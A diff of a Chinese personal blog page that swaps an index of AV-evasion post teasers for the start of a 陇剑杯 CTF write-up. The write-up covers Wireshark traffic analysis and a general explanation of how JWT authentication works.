@@ -8,13 +8,61 @@
   <link rel="dns-prefetch" href="https://example.com">
   <title>Solkatt的小窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+  <meta name="description" content="陇剑杯wp签到题使用wireshark打开下载下来的‘Good.pcapng’流量包 1.1此时正在进行的可能是__协议的网络攻击（http,dns,ftp）打开流量包发现总共有ARP HTTP Tcp等协议，没有发现ftp，dns包，所以可以认为是http攻击">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Solkatt的小窝">
-<meta property="og:url" content="https://example.com/page/4/index.html">
+<meta property="og:url" content="https://example.com/2022/12/15/%E9%99%87%E5%89%91%E6%9D%AFwp/index.html">
 <meta property="og:site_name" content="Solkatt的小窝">
+<meta property="og:description" content="陇剑杯wp签到题使用wireshark打开下载下来的‘Good.pcapng’流量包 1.1此时正在进行的可能是__协议的网络攻击（http,dns,ftp）打开流量包发现总共有ARP HTTP Tcp等协议，没有发现ftp，dns包，所以可以认为是http攻击">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921104316921.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921104559838.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/bg2018072304.jpg">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921110654756.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921110841434.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921111118348.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921111734964.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921112205948.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921112758927.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921113011339.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921114517944.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921114537721.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921114557729.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921115205593.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921122936324.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921123617539.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921123626390.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921155539684.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921155600629.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921161425752.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921161837619.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921163714462.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921163739281.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210922141406481.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210922145012989.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210922145204628.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210922145310546.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210922150124976.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210922150151245.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210922152441681.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210922155115371.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210922160140196.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210923103047988.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210923103217663.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210923103531678.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210923104036082.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210923110605369.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210923110801977.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210923111118010.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210923114802350.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210927120502741.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210927120649169.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210927120910002.png">
+<meta property="article:published_time" content="2022-12-15T06:39:43.234Z">
+<meta property="article:modified_time" content="2022-12-15T06:40:12.561Z">
 <meta property="article:author" content="Solkatt">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921104316921.png">
   
     <link rel="alternative" href="/atom.xml" title="Solkatt的小窝" type="application/atom+xml">
   
@@ -142,508 +190,193 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-文本类型的免杀" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-陇剑杯wp" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/06/20/%E6%96%87%E6%9C%AC%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%85%8D%E6%9D%80/">文本类型的免杀</a>
-    </h1>
-  
-
-        
-        <a href="/2022/06/20/%E6%96%87%E6%9C%AC%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%85%8D%E6%9D%80/" class="archive-article-date">
-  	<time datetime="2022-06-20T07:09:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-20</time>
-</a>
-        
-      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Powershell与Amsi"><a href="#Powershell与Amsi" class="headerlink" title="Powershell与Amsi"></a>Powershell与Amsi</h1><h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><p>作为Windows系统内置工具， Powershell脚本的功能十分强大，同时作为系统的功能组件不会被常规杀毒引擎查杀。兼具这两个有点，Powershell的恶意利用程序得到快速发展，从2012年Powershell 攻击利用工具成型化以来，互联网中的通过无文件与Powershell的攻击事件数量逐年递增。无文件攻击在感染计算机时，不需写入磁盘即可从事恶意活动，绕过那些基于签名和文件检测的传统安全软件。 如何检测这些恶意行为成了安全厂商和企业用户与个人更为关心的问题。微软在2015年中旬开始提出了针对无文件攻击和Powershell脚本攻击的检测缓解方案-AMSI。</p>
-        
-          <a class="article-more-a" href="/2022/06/20/%E6%96%87%E6%9C%AC%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%85%8D%E6%9D%80/#more">more >></a>
-        
-      
+        <h1 id="陇剑杯wp"><a href="#陇剑杯wp" class="headerlink" title="陇剑杯wp"></a>陇剑杯wp</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>使用wireshark打开下载下来的‘Good.pcapng’流量包</p>
+<h3 id="1-1此时正在进行的可能是-协议的网络攻击（http-dns-ftp）"><a href="#1-1此时正在进行的可能是-协议的网络攻击（http-dns-ftp）" class="headerlink" title="1.1此时正在进行的可能是__协议的网络攻击（http,dns,ftp）"></a>1.1此时正在进行的可能是__协议的网络攻击（http,dns,ftp）</h3><p>打开流量包发现总共有ARP HTTP Tcp等协议，没有发现ftp，dns包，所以可以认为是http攻击</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921104316921.png" alt="image-20210921104316921"></p>
+<span id="more"></span>
 
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">萌新免杀的故事</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/06/20/%E6%96%87%E6%9C%AC%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%85%8D%E6%9D%80/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-cos远程加载器编写" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/06/18/cos%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BC%96%E5%86%99/">cos远程加载器编写</a>
-    </h1>
-  
-
-        
-        <a href="/2022/06/18/cos%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BC%96%E5%86%99/" class="archive-article-date">
-  	<time datetime="2022-06-18T14:57:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-18</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在免杀的过程中，分离免杀因为其加载器和shellcode分离的原因让特征不明显，分离免杀成为了现在的主流免杀方式了。</p>
-        
-          <a class="article-more-a" href="/2022/06/18/cos%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BC%96%E5%86%99/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">萌新免杀的故事</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/06/18/cos%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BC%96%E5%86%99/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Syscall" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/06/14/Syscall/">Syscall</a>
-    </h1>
-  
-
-        
-        <a href="/2022/06/14/Syscall/" class="archive-article-date">
-  	<time datetime="2022-06-14T08:30:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h1><h2 id="syscall基础概念"><a href="#syscall基础概念" class="headerlink" title="syscall基础概念"></a>syscall基础概念</h2><p>Windows下有两种处理器访问模式：用户模式(User mode)和内核模式(Kernel mode)。</p>
-<p>用户模式下运行应用程序时，Windows会为该程序创建一个新进程，提供一个私有虚拟地址空间和一个私有句柄表，因为私有，一个应用程序无法修改另一个应用程序的私有虚拟地址空间的数据。</p>
-<p>内核模式下，所有运行的代码都共享一个虚拟地址空间，因此内核中驱动程序可能还会因为写入错误的地址空间导致其他驱动程序甚至系统出现错误。</p>
-<p>内核中包含了大部分操作系统的内部数据结构，所以用户模式下的应用程序在访问这些数据结构或调用内部windows例程以执行特权操作的时候，必须先从用户模式切换到内核模式，这里就涉及到了系统调用。 </p>
-<p>x86 windows使用<code>SYSENTER</code>实现系统调用</p>
-<p>x64 windows使用<code>syscall</code>实现系统调用</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">萌新免杀的故事</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/06/14/Syscall/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-浅谈PE结构" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/05/11/%E6%B5%85%E8%B0%88PE%E7%BB%93%E6%9E%84/">浅谈PE结构</a>
-    </h1>
-  
-
-        
-        <a href="/2022/05/11/%E6%B5%85%E8%B0%88PE%E7%BB%93%E6%9E%84/" class="archive-article-date">
-  	<time datetime="2022-05-11T06:41:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-05-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="什么是PE结构"><a href="#什么是PE结构" class="headerlink" title="什么是PE结构"></a>什么是PE结构</h1><p>PE结构是Windows操作系统下标准的可执行文件的头格式</p>
-<p>当你用二进制的编辑器(如010editor)打开一个exe文件，就会发现这里面有PE结构，其中包括但不限于<code>DOS头</code>，<code>NT头</code>,<code>可选NT头</code>，<code>节头</code>。</p>
-        
-          <a class="article-more-a" href="/2022/05/11/%E6%B5%85%E8%B0%88PE%E7%BB%93%E6%9E%84/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">萌新免杀的故事</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/05/11/%E6%B5%85%E8%B0%88PE%E7%BB%93%E6%9E%84/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ShellCode上线分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/05/01/ShellCode%E4%B8%8A%E7%BA%BF%E5%88%86%E6%9E%90/">ShellCode上线分析</a>
-    </h1>
-  
-
-        
-        <a href="/2022/05/01/ShellCode%E4%B8%8A%E7%BA%BF%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2022-05-01T04:03:36.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-05-01</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="杀毒软件对文件危险的判定等级"><a href="#杀毒软件对文件危险的判定等级" class="headerlink" title="杀毒软件对文件危险的判定等级"></a>杀毒软件对文件危险的判定等级</h1><p>从文件落地到磁盘上开始，杀毒软件就已经对落地文件进行了扫描与检测，这里我们需要知道杀毒软件对文件危险系数的判定等级。</p>
-<p>1.无害</p>
-<p>无害等级，没有任何问题。杀毒软件从此不会管你。</p>
-<p>2.可疑</p>
-<p>如果确定文件为可疑等级，那么杀毒软件会持续监控软件的行为特征。</p>
-<p>3.确认病毒</p>
-<p>如果确定文件为病毒，那么杀毒软件就会直接把文件刀掉。</p>
-        
-          <a class="article-more-a" href="/2022/05/01/ShellCode%E4%B8%8A%E7%BA%BF%E5%88%86%E6%9E%90/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">萌新免杀的故事</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/05/01/ShellCode%E4%B8%8A%E7%BA%BF%E5%88%86%E6%9E%90/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-使用windowsapi调用注册表操作" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/04/27/%E4%BD%BF%E7%94%A8windowsapi%E8%B0%83%E7%94%A8%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%93%8D%E4%BD%9C/">使用windowsapi调用注册表操作</a>
-    </h1>
-  
-
-        
-        <a href="/2022/04/27/%E4%BD%BF%E7%94%A8windowsapi%E8%B0%83%E7%94%A8%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%93%8D%E4%BD%9C/" class="archive-article-date">
-  	<time datetime="2022-04-26T16:56:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-27</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近为了学习免杀，需要先从<code>C++</code>开始打基础。对于我这个从来没学过C语言的菜鸡，真的是异常的艰险和挑战。这里往下对遇到的坑做下记录。</p>
-<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>用C++的主要目的就是为了会调用<code>windowsapi</code>函数，但是<code>windowsapi</code>函数不仅复杂，而且我在网上也没看到什么好的教学。基本上就相当于只有个人看文章了，这里我特地用了以下几个帮助我学习:</p>
-<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Windows%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/488845">1.windowsAPI</a>数据类型</p>
-<p>2.MSDN</p>
-<p>3.对应的需要调用的函数的前人示例。</p>
-        
-          <a class="article-more-a" href="/2022/04/27/%E4%BD%BF%E7%94%A8windowsapi%E8%B0%83%E7%94%A8%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%93%8D%E4%BD%9C/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">萌新免杀的故事</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/04/27/%E4%BD%BF%E7%94%A8windowsapi%E8%B0%83%E7%94%A8%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%93%8D%E4%BD%9C/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-恶意代码与反病毒介绍" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/04/24/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E4%B8%8E%E5%8F%8D%E7%97%85%E6%AF%92%E4%BB%8B%E7%BB%8D/">恶意代码与反病毒介绍</a>
-    </h1>
-  
-
-        
-        <a href="/2022/04/24/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E4%B8%8E%E5%8F%8D%E7%97%85%E6%AF%92%E4%BB%8B%E7%BB%8D/" class="archive-article-date">
-  	<time datetime="2022-04-24T15:13:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-24</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="恶意代码与反病毒的基本概念"><a href="#恶意代码与反病毒的基本概念" class="headerlink" title="恶意代码与反病毒的基本概念"></a>恶意代码与反病毒的基本概念</h1><h2 id="恶意代码的基本概念及危害"><a href="#恶意代码的基本概念及危害" class="headerlink" title="恶意代码的基本概念及危害"></a>恶意代码的基本概念及危害</h2><p>只要是运行用户预期之外的目的的代码都算恶意代码</p>
-<h2 id="以目的划分类型"><a href="#以目的划分类型" class="headerlink" title="以目的划分类型"></a>以目的划分类型</h2><ol>
-<li>木马(控制、信息获取)</li>
-<li>病毒(破坏)</li>
-<li>其他(捆绑、广告等其他经济利益)</li>
+<h2 id="jwt题"><a href="#jwt题" class="headerlink" title="jwt题"></a>jwt题</h2><p>使用wireshark打开下载下来的‘goroot.pcap’流量包</p>
+<p>发现有http包，便选择过滤，右键选择追踪流进入http流</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921104559838.png" alt="image-20210921104559838"></p>
+<h3 id="2-1该网站使用了什么认证方式"><a href="#2-1该网站使用了什么认证方式" class="headerlink" title="2.1该网站使用了什么认证方式"></a>2.1该网站使用了什么认证方式</h3><h4 id="科普知识：JWT"><a href="#科普知识：JWT" class="headerlink" title="科普知识：JWT"></a>科普知识：JWT</h4><p>JWT全程为json web token 是目前最流行的跨域认证解决方案。</p>
+<h5 id="跨域认证的问题"><a href="#跨域认证的问题" class="headerlink" title="跨域认证的问题"></a>跨域认证的问题</h5><p>互联网服务的用户认证流程一般如下</p>
+<ol>
+<li>用户向服务器发送用户名和密码</li>
+<li>服务期验证过后，在当前对话（session）里面保存相关数据，比如用户角色，登陆时间等</li>
+<li>服务器向用户返回一个session_id，写入用户的cookie</li>
+<li>用户随后的每一个请求，都会通过cookie，将session_id传回服务器。</li>
+<li>服务器收到session_id。找到前期保存的数据，由此得到用户的身份。</li>
 </ol>
-<h2 id="蠕虫"><a href="#蠕虫" class="headerlink" title="蠕虫"></a>蠕虫</h2><p>蠕虫其实并不算某一种恶意代码，它算是一种手段，只要能够用来传播的手段，都可以称为蠕虫。</p>
+<p>现在我们考虑的是如果要求A网站和B网站是同一家公司的关联服务，现在要求，用户只要在其中一个网站登录，再访问另一个网站就会自动登录，请问怎么实现。</p>
+<p>JWT就提供了解决方案，服务器不保存用户的session数据，所有数据都再客户端，每次请求都发回服务器。</p>
+<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>JWT的原理是，服务器认证以后，生成一个JSON对象，发送给用户，就像下面这样：</p>
+<p>{ “name”:”smith”, </p>
+<p>“age”:30, </p>
+<p>“sex”:男 }</p>
+<p>（有点类似于python的字典）</p>
+<p>以后，用户每次想和服务器通讯，都会发送这个json对象。服务器完全只靠这个对象来认定用户身份。这样服务器就可以不保存session数据，减轻了服务器的载荷同时也易于扩展。</p>
+<h5 id="JWT的数据结构"><a href="#JWT的数据结构" class="headerlink" title="JWT的数据结构"></a>JWT的数据结构</h5><p>实际的JWT就像下面这样</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/bg2018072304.jpg" alt="img"></p>
+<p>中间用<code>.</code>分割成三个部分。JWT内部是没有换行的，这里是为了好表示，所以写成了几行。</p>
+<p>JWT的三个部分有Header Payload Signature，分别是头部，载荷，签名</p>
+<p>Header部分就是一个json对象，它用来描述JWT的元数据。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921110654756.png" alt="image-20210921110654756"></p>
+<p>payload也是一个json对象，用来存放我们实际需要传送的数据。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921110841434.png" alt="image-20210921110841434"></p>
+<p>最后Signature是为了防止对两部分内容进行数据篡改，而采用的安全措施。</p>
+<p>服务器会存有一个密钥，然后使用header里面指定的签名算法（默认为HMAC SHA256），按照以下公式来产生签名。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921111118348.png" alt="image-20210921111118348"></p>
+<p>然后把三个部分拼接为字符串，每个部分用点(.)分割，然后传给用户。</p>
+<h5 id="JWT的几个特点"><a href="#JWT的几个特点" class="headerlink" title="JWT的几个特点"></a>JWT的几个特点</h5><ol>
+<li>JWT默认是不加密的。所以最好不要将秘密数据放在JWT里面。</li>
+<li>JWT不仅可以用作用户验证，也可以用于交换信息，有效使用JWT，可以降低服务器查询数据库的次数。</li>
+<li>JWT的最大缺点为，因为服务器不保存session状态，所以再服务器签发了某个JWT后，并不能废除或者更改某个TOKEN。</li>
+<li>JWT本身包含了认证信息，一旦泄露的话，任何人都可以获得该令牌的所有权限，为了减少盗用，JWT的有效期应该设置为比较短。</li>
+<li>传输JWT的时候，应该用HTTPS协议传输。</li>
+</ol>
+<h3 id="2-1解法"><a href="#2-1解法" class="headerlink" title="2.1解法"></a>2.1解法</h3><p>查找数据包，会发现再token里有下列数据</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20210921111734964.png" alt="image-20210921111734964"></p>
+<p>这就是JWT的类型，所以判断出使用了JWT认证方式。</p>
